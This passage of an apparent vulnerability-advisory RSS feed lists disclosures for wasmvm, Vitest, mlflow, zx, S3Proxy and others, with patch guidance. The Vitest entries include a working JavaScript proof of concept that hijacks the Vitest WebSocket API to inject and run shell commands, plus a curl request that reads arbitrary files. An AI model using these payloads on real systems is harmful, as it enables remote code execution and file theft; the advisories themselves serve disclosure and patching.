- 2.0: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;wasmvm&#x2F;commit&#x2F;d4ff2adee44e6b9f7415a5dfbb3de745ab9b7678
- 2.1: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;wasmvm&#x2F;commit&#x2F;8d44a286fabc793a2fba93752e58cd0fd5b88a2d
- 2.2: https:&#x2F;&#x2F;github.com&#x2F;CosmWasm&#x2F;wasmvm&#x2F;commit&#x2F;0aefa4c378457aeb3c07e7975b875be38872c56d

## Applying the patch

The patch will be shipped in releases of wasmvm. You can update more or less as follows:

1. Check the current wasmvm version: `go list -m github.com&#x2F;CosmWasm&#x2F;wasmvm`
2. Bump the `github.com&#x2F;CosmWasm&#x2F;wasmvm` dependency in your go.mod to one of the patched version
   depending on which minor version you are on; `go mod tidy`; commit.
3. If you use the static libraries `libwasmvm_muslc.aarch64.a`&#x2F;`libwasmvm_muslc.x86_64.a`, update them accordingly.
4. Check the updated wasmvm version: `go list -m github.com&#x2F;CosmWasm&#x2F;wasmvm` and ensure you see 1.5.8, 2.0.6, 2.1.5 or 2.2.2.
5. Follow your regular practices to deploy chain upgrades.

While the fix for this issue is not consensus breaking, the patch contains another
consensus breaking fix and requires a coordinated upgrade.

## Acknowledgement

This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.

If you believe you have found a bug in the Interchain Stack or would like to contribute to the
program by reporting a bug, please see &amp;lt;https:&#x2F;&#x2F;hackerone.com&#x2F;cosmos&amp;gt;.

## Timeline

- 2024-11-25: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.
- 2024-11-28: Confio security contributors confirm the report.
- 2024-11-28: Confio developed the patch internally.
- 2025-02-04: Patch gets released.

[^1]: following Amulet&#x27;s Severity Classification Framework ACMv1.2: https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;0295254e8645301ccb606d46108a45cede0a73e0&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9crc-q9x8-hgqq: 9.6 | <b>Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9crc-q9x8-hgqq</link>
                    <pubDate>2025-02-04T17:00:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9crc-q9x8-hgqq'>https://osv.dev/vulnerability/GHSA-9crc-q9x8-hgqq</a><br>
                            <b>Published:</b> 2025-02-04T17:00:57Z<br>
                            <b>Severity:</b> 9.6<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq'>https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc'>https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241'>https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383'>https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest'>https://github.com/vitest-dev/vitest</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46'>https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76'>https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li><li>- <a target='_blank' href='https://vitest.dev/config/#api'>https://vitest.dev/config/#api</a></li></ul><br>
                            <b>Details:</b> <b>Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening</b><br>### Summary
Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.

### Details
When [`api` option](https:&#x2F;&#x2F;vitest.dev&#x2F;config&#x2F;#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
https:&#x2F;&#x2F;github.com&#x2F;vitest-dev&#x2F;vitest&#x2F;blob&#x2F;9a581e1c43e5c02b11e2a8026a55ce6a8cb35114&#x2F;packages&#x2F;vitest&#x2F;src&#x2F;api&#x2F;setup.ts#L32-L46

This WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.
https:&#x2F;&#x2F;github.com&#x2F;vitest-dev&#x2F;vitest&#x2F;blob&#x2F;9a581e1c43e5c02b11e2a8026a55ce6a8cb35114&#x2F;packages&#x2F;vitest&#x2F;src&#x2F;api&#x2F;setup.ts#L66-L76

### PoC
1. Open Vitest UI.
2. Access a malicious web site with the script below.
3. If you have `calc` executable in `PATH` env var (you&#x27;ll likely have it if you are running on Windows), that application will be executed.

```js
&#x2F;&#x2F; code from https:&#x2F;&#x2F;github.com&#x2F;WebReflection&#x2F;flatted
const Flatted=function(n){&quot;use strict&quot;;function t(n){return t=&quot;function&quot;==typeof Symbol&amp;&amp;&quot;symbol&quot;==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;&quot;function&quot;==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?&quot;symbol&quot;:typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=&quot;string&quot;,i={},c=&quot;object&quot;,a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&amp;lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&amp;lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({&quot;&quot;:i},&quot;&quot;,i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return&quot;&quot;===n||-1&amp;lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({&quot;&quot;:n},&quot;&quot;,n)),v=!y;y&amp;lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return&quot;[&quot;+s.join(&quot;,&quot;)+&quot;]&quot;;function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

&#x2F;&#x2F; actual code to run
const ws = new WebSocket(&#x27;ws:&#x2F;&#x2F;localhost:51204&#x2F;__vitest_api__&#x27;)
ws.addEventListener(&#x27;message&#x27;, e =&amp;gt; {
    console.log(e.data)
})
ws.addEventListener(&#x27;open&#x27;, () =&amp;gt; {
    ws.send(Flatted.stringify({ t: &#x27;q&#x27;, i: crypto.randomUUID(), m: &quot;getFiles&quot;, a: [] }))

    const testFilePath = &quot;&#x2F;path&#x2F;to&#x2F;test-file&#x2F;basic.test.ts&quot; &#x2F;&#x2F; use a test file returned from the response of &quot;getFiles&quot;

    &#x2F;&#x2F; edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: &#x27;q&#x27;,
      i: crypto.randomUUID(),
      m: &quot;saveTestFile&quot;,
      a: [testFilePath, &quot;import child_process from &#x27;child_process&#x27;;child_process.execSync(&#x27;calc&#x27;)&quot;]
    }))
    &#x2F;&#x2F; rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: &#x27;q&#x27;,
      i: crypto.randomUUID(),
      m: &quot;rerun&quot;,
      a: [testFilePath]
    }))
})
```

### Impact
This vulnerability can result in remote code execution for users that are using Vitest serve API.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8gvc-j273-4wm5: 5.9 | <b>Vitest browser mode serves arbitrary files</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8gvc-j273-4wm5</link>
                    <pubDate>2025-02-04T16:51:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8gvc-j273-4wm5'>https://osv.dev/vulnerability/GHSA-8gvc-j273-4wm5</a><br>
                            <b>Published:</b> 2025-02-04T16:51:08Z<br>
                            <b>Severity:</b> 5.9<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5'>https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f'>https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf'>https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest'>https://github.com/vitest-dev/vitest</a></li><li>- <a target='_blank' href='https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130'>https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></li><li>- <a target='_blank' href='https://vitest.dev/guide/browser/config.html#browser-api'>https://vitest.dev/guide/browser/config.html#browser-api</a></li></ul><br>
                            <b>Details:</b> <b>Vitest browser mode serves arbitrary files</b><br>### Summary
`__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by [`browser.api.host: true`](https:&#x2F;&#x2F;vitest.dev&#x2F;guide&#x2F;browser&#x2F;config.html#browser-api), an attacker can send a request to that handler from remote to get the content of arbitrary files.

### Details
This `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system.
https:&#x2F;&#x2F;github.com&#x2F;vitest-dev&#x2F;vitest&#x2F;blob&#x2F;f17918a79969d27a415f70431e08a9445b051e45&#x2F;packages&#x2F;browser&#x2F;src&#x2F;node&#x2F;plugin.ts#L88-L130

This code was added by https:&#x2F;&#x2F;github.com&#x2F;vitest-dev&#x2F;vitest&#x2F;commit&#x2F;2d62051f13b4b0939b2f7e94e88006d830dc4d1f.

### PoC
1. Create a directory and change the current directory to that directory
1. Run `npx vitest init browser`
1. Run `npm run test:browser`
2. Run `curl http:&#x2F;&#x2F;localhost:63315&#x2F;__screenshot-error?file=&#x2F;path&#x2F;to&#x2F;any&#x2F;file`

### Impact
Users explicitly exposing the browser mode server to the network by [`browser.api.host: true`](https:&#x2F;&#x2F;vitest.dev&#x2F;guide&#x2F;browser&#x2F;config.html#browser-api) may get any files exposed.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-1483: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-1483</link>
                    <pubDate>2025-02-04T07:22:21.033Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-1483'>https://osv.dev/vulnerability/BIT-mlflow-2024-1483</a><br>
                            <b>Published:</b> 2025-02-04T07:22:21.033Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d'>https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in mlflow&#x2F;mlflow version 2.9.2, allowing attackers to access arbitrary files on the server. By crafting a series of HTTP POST requests with specially crafted &#x27;artifact_location&#x27; and &#x27;source&#x27; parameters, using a local URI with &#x27;#&#x27; instead of &#x27;?&#x27;, an attacker can traverse the server&#x27;s directory structure. The issue occurs due to insufficient validation of user-supplied input in the server&#x27;s handlers.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-1558: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-1558</link>
                    <pubDate>2025-02-04T07:22:09.430Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-1558'>https://osv.dev/vulnerability/BIT-mlflow-2024-1558</a><br>
                            <b>Published:</b> 2025-02-04T07:22:09.430Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081'>https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in the `_create_model_version()` function within `server&#x2F;handlers.py` of the mlflow&#x2F;mlflow repository, due to improper validation of the `source` parameter. Attackers can exploit this vulnerability by crafting a `source` parameter that bypasses the `_validate_non_local_source_contains_relative_paths(source)` function&#x27;s checks, allowing for arbitrary file read access on the server. The issue arises from the handling of unquoted URL characters and the subsequent misuse of the original `source` value for model version creation, leading to the exposure of sensitive files when interacting with the `&#x2F;model-versions&#x2F;get-artifact` handler.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-1560: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-1560</link>
                    <pubDate>2025-02-04T07:21:57.427Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-1560'>https://osv.dev/vulnerability/BIT-mlflow-2024-1560</a><br>
                            <b>Published:</b> 2025-02-04T07:21:57.427Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://huntr.com/bounties/4a34259c-3c8f-4872-b178-f27fbc876b98'>https://huntr.com/bounties/4a34259c-3c8f-4872-b178-f27fbc876b98</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in the mlflow&#x2F;mlflow repository, specifically within the artifact deletion functionality. Attackers can bypass path validation by exploiting the double decoding process in the `_delete_artifact_mlflow_artifacts` handler and `local_file_uri_to_path` function, allowing for the deletion of arbitrary directories on the server&#x27;s filesystem. This vulnerability is due to an extra unquote operation in the `delete_artifacts` function of `local_artifact_repo.py`, which fails to properly sanitize user-supplied paths. The issue is present up to version 2.9.2, despite attempts to fix a similar issue in CVE-2023-6831.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-1593: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-1593</link>
                    <pubDate>2025-02-04T07:21:44.709Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-1593'>https://osv.dev/vulnerability/BIT-mlflow-2024-1593</a><br>
                            <b>Published:</b> 2025-02-04T07:21:44.709Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://huntr.com/bounties/dbdc6bd6-d09a-46f2-9d9c-5138a14b6e31'>https://huntr.com/bounties/dbdc6bd6-d09a-46f2-9d9c-5138a14b6e31</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in the mlflow&#x2F;mlflow repository due to improper handling of URL parameters. By smuggling path traversal sequences using the &#x27;;&#x27; character in URLs, attackers can manipulate the &#x27;params&#x27; portion of the URL to gain unauthorized access to files or directories. This vulnerability allows for arbitrary data smuggling into the &#x27;params&#x27; part of the URL, enabling attacks similar to those described in previous reports but utilizing the &#x27;;&#x27; character for parameter smuggling. Successful exploitation could lead to unauthorized information disclosure or server compromise.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-1594: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-1594</link>
                    <pubDate>2025-02-04T07:21:32.028Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-1594'>https://osv.dev/vulnerability/BIT-mlflow-2024-1594</a><br>
                            <b>Published:</b> 2025-02-04T07:21:32.028Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://huntr.com/bounties/424b6f6b-e778-4a2b-b860-39730d396f3e'>https://huntr.com/bounties/424b6f6b-e778-4a2b-b860-39730d396f3e</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A path traversal vulnerability exists in the mlflow&#x2F;mlflow repository, specifically within the handling of the `artifact_location` parameter when creating an experiment. Attackers can exploit this vulnerability by using a fragment component `#` in the artifact location URI to read arbitrary files on the server in the context of the server&#x27;s process. This issue is similar to CVE-2023-6909 but utilizes a different component of the URI to achieve the same effect. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-3573: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-3573</link>
                    <pubDate>2025-02-04T07:20:26.331Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-3573'>https://osv.dev/vulnerability/BIT-mlflow-2024-3573</a><br>
                            <b>Published:</b> 2025-02-04T07:20:26.331Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/mlflow/mlflow/commit/438a450714a3ca06285eeea34bdc6cf79d7f6cbc'>https://github.com/mlflow/mlflow/commit/438a450714a3ca06285eeea34bdc6cf79d7f6cbc</a></li><li>- <a target='_blank' href='https://huntr.com/bounties/8ea058a7-4ef8-4baf-9198-bc0147fc543c'>https://huntr.com/bounties/8ea058a7-4ef8-4baf-9198-bc0147fc543c</a></li></ul><br>
                            <b>Details:</b> <b></b><br>mlflow&#x2F;mlflow is vulnerable to Local File Inclusion (LFI) due to improper parsing of URIs, allowing attackers to bypass checks and read arbitrary files on the system. The issue arises from the &#x27;is_local_uri&#x27; function&#x27;s failure to properly handle URIs with empty or &#x27;file&#x27; schemes, leading to the misclassification of URIs as non-local. Attackers can exploit this by crafting malicious model versions with specially crafted &#x27;source&#x27; parameters, enabling the reading of sensitive files within at least two directory levels from the server&#x27;s root.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-mlflow-2024-4263: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-mlflow-2024-4263</link>
                    <pubDate>2025-02-04T07:17:58.524Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-mlflow-2024-4263'>https://osv.dev/vulnerability/BIT-mlflow-2024-4263</a><br>
                            <b>Published:</b> 2025-02-04T07:17:58.524Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/mlflow/mlflow/commit/b43e0e3de5b500554e13dc032ba2083b2d6c94b8'>https://github.com/mlflow/mlflow/commit/b43e0e3de5b500554e13dc032ba2083b2d6c94b8</a></li><li>- <a target='_blank' href='https://huntr.com/bounties/bfa116d3-2af8-4c4a-ac34-ccde7491ae11'>https://huntr.com/bounties/bfa116d3-2af8-4c4a-ac34-ccde7491ae11</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A broken access control vulnerability exists in mlflow&#x2F;mlflow versions before 2.10.1, where low privilege users with only EDIT permissions on an experiment can delete any artifacts. This issue arises due to the lack of proper validation for DELETE requests by users with EDIT permissions, allowing them to perform unauthorized deletions of artifacts. The vulnerability specifically affects the handling of artifact deletions within the application, as demonstrated by the ability of a low privilege user to delete a directory inside an artifact using a DELETE request, despite the official documentation stating that users with EDIT permission can only read and update artifacts, not delete them.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-qwp8-x4ff-5h87: 5.2 | <b>ZX Allows Environment Variable Injection for dotenv API</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-qwp8-x4ff-5h87</link>
                    <pubDate>2025-02-03T22:34:08Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-qwp8-x4ff-5h87'>https://osv.dev/vulnerability/GHSA-qwp8-x4ff-5h87</a><br>
                            <b>Published:</b> 2025-02-03T22:34:08Z<br>
                            <b>Severity:</b> 5.2<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/google/zx/security/advisories/GHSA-qwp8-x4ff-5h87'>https://github.com/google/zx/security/advisories/GHSA-qwp8-x4ff-5h87</a></li><li>- <a target='_blank' href='https://github.com/google/zx/pull/1094'>https://github.com/google/zx/pull/1094</a></li><li>- <a target='_blank' href='https://github.com/google/zx/commit/5ba714d14ecf0555a74d4db96622840ac19839c5'>https://github.com/google/zx/commit/5ba714d14ecf0555a74d4db96622840ac19839c5</a></li><li>- <a target='_blank' href='https://github.com/google/zx'>https://github.com/google/zx</a></li><li>- <a target='_blank' href='https://github.com/webpod/envapi/blob/v0.2.1/src/main/ts/envapi.ts#L74-L77'>https://github.com/webpod/envapi/blob/v0.2.1/src/main/ts/envapi.ts#L74-L77</a></li></ul><br>
                            <b>Details:</b> <b>ZX Allows Environment Variable Injection for dotenv API</b><br>### Impact
This vulnerability is an **Environment Variable Injection** issue in `dotenv.stringify`, affecting `google&#x2F;zx`  version **8.3.1**.

An attacker with control over environment variable values can inject unintended environment variables into `process.env`. This can lead to **arbitrary command execution** or **unexpected behavior** in applications that rely on environment variables for security-sensitive operations. Applications that process untrusted input and pass it through `dotenv.stringify` are particularly vulnerable.

### Patches
This issue has been **patched** in version **8.3.2**. Users should **immediately upgrade** to this version to mitigate the vulnerability.

### Workarounds
If upgrading is not feasible, users can mitigate the vulnerability by **sanitizing user-controlled environment variable values** before passing them to `dotenv.stringify`. Specifically, avoid using `&quot;`, `&#x27;`, and backticks in values, or enforce strict validation of environment variables before usage.

### References
- [Issue Report](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;zx&#x2F;issues&#x2F;)
- [Security Policy](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;zx&#x2F;security&#x2F;policy)
- [Google Vulnerability Disclosure](https:&#x2F;&#x2F;g.co&#x2F;vulnz)
- [Patch](https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;zx&#x2F;pull&#x2F;1094)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-57669: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-57669</link>
                    <pubDate>2025-02-03T20:15:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-57669'>https://osv.dev/vulnerability/CVE-2024-57669</a><br>
                            <b>Published:</b> 2025-02-03T20:15:34Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/94fzb/zrlog/issues/193'>https://github.com/94fzb/zrlog/issues/193</a></li><li>- <a target='_blank' href='https://github.com/HypeDuke/vulnerable-research/blob/main/CVE-2024-57669'>https://github.com/HypeDuke/vulnerable-research/blob/main/CVE-2024-57669</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Directory Traversal vulnerability in Zrlog backup-sql-file.jar v.3.0.31 allows a remote attacker to obtain sensitive information via the BackupController.java file.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56921: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56921</link>
                    <pubDate>2025-02-03T20:15:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56921'>https://osv.dev/vulnerability/CVE-2024-56921</a><br>
                            <b>Published:</b> 2025-02-03T20:15:33Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/open5gs/open5gs/issues/3608'>https://github.com/open5gs/open5gs/issues/3608</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in Open5gs v2.7.2. InitialUEMessage, Registration request sent at a specific time can crash AMF due to incorrect error handling of gmm_state_exception() function upon receipt of the Nausf_UEAuthentication_Authenticate response.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-56946: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-56946</link>
                    <pubDate>2025-02-03T20:15:33Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-56946'>https://osv.dev/vulnerability/CVE-2024-56946</a><br>
                            <b>Published:</b> 2025-02-03T20:15:33Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/TechnitiumSoftware/DnsServer/blob/master/CHANGELOG.md#version-133'>https://github.com/TechnitiumSoftware/DnsServer/blob/master/CHANGELOG.md#version-133</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Denial of service in DNS-over-QUIC in Technitium DNS Server &amp;lt;= v13.2.2 allows remote attackers to permanently stop the server from accepting new DNS-over-QUIC connections by triggering unhandled exceptions in listener threads.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2ccp-vqmv-4r4x: 6.9 | <b>S3Proxy allows insecure path traversal in filesystem and filesystem-nio2 storage backends</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2ccp-vqmv-4r4x</link>
                    <pubDate>2025-02-03T17:56:03Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2ccp-vqmv-4r4x'>https://osv.dev/vulnerability/GHSA-2ccp-vqmv-4r4x</a><br>
                            <b>Published:</b> 2025-02-03T17:56:03Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/gaul/s3proxy/security/advisories/GHSA-2ccp-vqmv-4r4x'>https://github.com/gaul/s3proxy/security/advisories/GHSA-2ccp-vqmv-4r4x</a></li><li>- <a target='_blank' href='https://github.com/apache/jclouds/commit/b0819e0ef5e08c792a4d1724b938714ce9503aa3'>https://github.com/apache/jclouds/commit/b0819e0ef5e08c792a4d1724b938714ce9503aa3</a></li><li>- <a target='_blank' href='https://github.com/gaul/s3proxy/commit/86b6ee4749aa163a78e7898efc063617ed171980'>https://github.com/gaul/s3proxy/commit/86b6ee4749aa163a78e7898efc063617ed171980</a></li><li>- <a target='_blank' href='https://github.com/gaul/s3proxy'>https://github.com/gaul/s3proxy</a></li></ul><br>
                            <b>Details:</b> <b>S3Proxy allows insecure path traversal in filesystem and filesystem-nio2 storage backends</b><br>### Impact
Users of the filesystem and filesystem-nio2 storage backends could unintentionally expose local files to authenticated clients.

### Patches
Upgrade to S3Proxy 2.6.0 which includes apache&#x2F;jclouds@b0819e0ef5e08c792a4d1724b938714ce9503aa3 and 86b6ee4749aa163a78e7898efc063617ed171980.

### Workarounds
None

### References
Privately reported by XBOW Team @xbow-security.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-r3r4-g7hq-pq4f: 0 | <b>CometBFT allows a malicious peer to stall the network by disseminating seemingly valid block parts</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-r3r4-g7hq-pq4f</link>
                    <pubDate>2025-02-03T16:48:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-r3r4-g7hq-pq4f'>https://osv.dev/vulnerability/GHSA-r3r4-g7hq-pq4f</a><br>
                            <b>Published:</b> 2025-02-03T16:48:59Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
